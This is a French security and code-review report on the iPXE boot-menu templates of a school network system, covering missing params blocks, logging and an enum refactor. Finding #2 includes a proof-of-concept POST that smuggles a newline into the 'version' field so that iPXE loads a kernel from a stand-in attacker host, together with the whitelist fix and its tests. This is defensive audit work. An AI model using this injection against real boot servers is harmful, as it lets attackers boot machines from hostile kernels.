## Détail des problèmes

### #1 — Bloc `params` absent dans `admin.blade.php` et `maintenance.blade.php`

**Sévérité** : 🔴 — **Pertinence Opus** : 3/3
**Fichier(s)** : `resources/views/ipxe/menu/admin.blade.php`, `resources/views/ipxe/menu/maintenance.blade.php`

**Constat initial (sonnet)** :
Les templates 3.2 enchaînent vers les endpoints suivants avec `chain --replace --autofree {{ $serverBaseUrl }}/ipxe/maintenance##params` (admin) et `chain --replace --autofree {{ $serverBaseUrl }}/ipxe/action/rescuecd##params` (maintenance), mais aucun bloc iPXE `params` / `param mac` / `param uuid` n'est posé avant le `:menu`. Le legacy `legacy/sambaedu/htdocs/ipxe/admin.php:69-74` ET `maintenance.php:19-22` posent toujours ce bloc.

**Avis Opus** (pertinence 3) :
Confirmé — sémantique iPXE : chaque script chargé par `chain` a son propre namespace de params (sandbox session-locale). Sans bloc `params` dans le script courant, `##params` injecte un namespace VIDE. Pas de loop 422 (FormRequest tolère nullable), MAIS :
- `MachineBootLog` se peuple avec `machine_name='unknown:<ip>'` pour les chains internes (mauvais audit)
- Le clic "retour" depuis maintenance → POST vers `/ipxe/admin##params` sans params → handshake admin → boucle de re-paramétrage
- Traçabilité cassée sur 100% des chains internes 3.2

**Solutions possibles** :
1. **(retenue)** Ajouter en tête de `admin.blade.php` et `maintenance.blade.php`, iso-legacy :
   ```
   params
   param mac {{ $mac }}
   param uuid {{ $uuid }}
   ```
   Et mettre à jour les tests `IpxeMenuRendererTest` pour asserter la présence de `param mac` dans le body rendu.
2. Alternative : passer `$mac`/`$uuid` aux templates via `compact()` dans `IpxeMenuRenderer::renderAdminMenu()` / `renderMaintenanceMenu()`.

**Action** : Correction automatique à appliquer.

### #2 — `$version` winpe non sanitisé — newline injection iPXE

**Sévérité** : 🔴 — **Pertinence Opus** : 2/3
**Fichier(s)** : `app/Ipxe/Services/IpxeActionResolver.php:91`, `app/Ipxe/Http/Requests/IpxeActionRequest.php`, `resources/views/ipxe/actions/winpe.blade.php:21-23`

**Constat initial (sonnet)** :
`IpxeActionResolver.php:91` lit `$version = (string) $request->input('version', self::DEFAULT_WIN_VERSION)` SANS `sanitizeAscii()`. `IpxeActionRequest::rules()` : `'version' => ['nullable', 'string', 'max:32']` — sans regex. Blade `{{ $version }}` = `htmlspecialchars()` qui n'échappe NI `\n` NI `\r`.

POC :
```
POST /ipxe/action/winpe HTTP/1.1
mac=...&uuid=...&version=Win11%0Akernel%20http://evil/x
```
→ ligne 21 du template devient :
```
initrd --name BCD Win11
kernel http://evil/x/boot/bcd BCD
```
Le firmware iPXE charge le kernel attaquant.

**Avis Opus** (pertinence 2) :
Confirmé. Atténuation `auth.v1.lan-only` LAN-only scolaire RFC1918 — mais c'est exactement le périmètre élèves. Aggravation : le legacy `actions/winpe.php:7` hardcode `$version = "Win11"` et IGNORE le POST → vecteur **introduit par le port 3.2**.

**Solutions possibles** :
1. **(retenue)** Whitelist enum stricte côté resolver : `Win10|Win11` (config `ipxe.actions.winpe.allowed_versions`).
2. Sanitize ASCII préventif `[A-Za-z0-9_]+` via regex FormRequest.
3. Combiner les deux pour défense en profondeur.

**Action** : Correction automatique à appliquer + test #B2.

## Décisions Henri (post-arbitrage 2026-05-19)

### Q1 — Log warning dédié `factory_reset` (#3)

**Décision** : ✅ Ajouter un event warning dédié.

**Implémentation** : `IpxeService::handleAction()` émet
`Log::channel('ipxe')->warning('ipxe.action.factory_reset_dispatched', [...])`
en parallèle de l'event info `ipxe.action.dispatched` lorsque
`$adminAction === IpxeAdminAction::FactoryReset`. Préfixes PII tronqués
6/8 chars (mac/uuid) iso AC7.3. Facilite l'alerte/filtre SIEM sur l'action
destructive sans relire chaque dispatch info.

**Tests** : 2 tests `IpxeServiceLoggingTest`
(`it_logs_warning_when_factory_reset_dispatched` +
`it_does_not_emit_factory_reset_warning_for_non_destructive_actions`).

### Q2 — `$version` winpe whitelist enum `Win10|Win11` (#2, #B2, sonnet question 3)

**Décision** : ✅ Whitelist enum stricte côté FormRequest + défense en
profondeur côté Resolver.

**Implémentation** :
- `config/ipxe.php` → `'actions.winpe.allowed_versions' => ['Win10', 'Win11']`.
- `IpxeActionRequest::rules()` → `'version' => ['nullable', 'string', Rule::in($allowedVersions)]`.
- `IpxeActionResolver::resolve()` → revalidation `in_array($rawVersion, $allowedVersions, true)`
  avec fallback `DEFAULT_WIN_VERSION='Win11'` sans exception (pour le cas
  où la FormRequest serait court-circuitée par les tests).

**Tests** : 2 tests `IpxeActionResolverTest`
(`it_rejects_invalid_version_and_falls_back_to_default` POC injection
newline + `it_accepts_whitelisted_version` Win10 propagation pure).

**Décision orthogonale** : la liste reste ASCII strict, à conserver en
extension manuelle (Win12 = éditer config + ajouter folder Apache).

### Q3 — `MachineBootLog` non persisté pour handshakes admin/maintenance (#B1)

**Décision** : ❌ Conserver iso-3.1 (log file uniquement, pas de
persistance DB).

**Justification** : la rétention `ipxe` daily 14j suffit pour l'audit
forensique. Le bénéfice DB (SIEM cross-corrélation) ne justifie pas le
coût de churn DB sur handshake (1 row par boot poste = très bruité).
Le test `it_does_not_persist_machine_boot_log_on_handshake` entérine
explicitement ce comportement comme attendu et est conservé.

**Reverse possible** : si Story 3.3+ apporte un besoin SIEM sur ce
trafic, ajouter une table `machine_handshake_logs` dédiée (pas peupler
MachineBootLog).

### Q4 — `IpxeMenuKind` dead code → consommé (#B3)

**Décision** : ✅ Consommer l'enum comme `$kind` dans `IpxeService::safeRender()`.

**Implémentation** :
- `IpxeMenuKind` enrichi de 6 cases supplémentaires (`Unknown`,
  `AdminHandshake`, `AdminMenu`, `MaintenanceHandshake`, `MaintenanceMenu`,
  `ActionHandshake`) → 12 cases au total.
- `IpxeService::safeRender(callable, string, string, string, IpxeMenuKind)` —
  type-safe au lieu de `string`. `$kind->value` injecté dans le log
  `error` (même valeur string que précédemment, rétrocompat log).
- Toutes les 8 invocations de `safeRender()` mises à jour avec les cases
  enum correspondants.
- Anti-typo : `'admin_handsahke'` (typo possible avant) → erreur
  compile-time désormais.

**Tests** : aucun test n'assertait directement sur ces strings (utilisées
uniquement dans les logs d'erreur non testés explicitement). Pas de
régression observable.
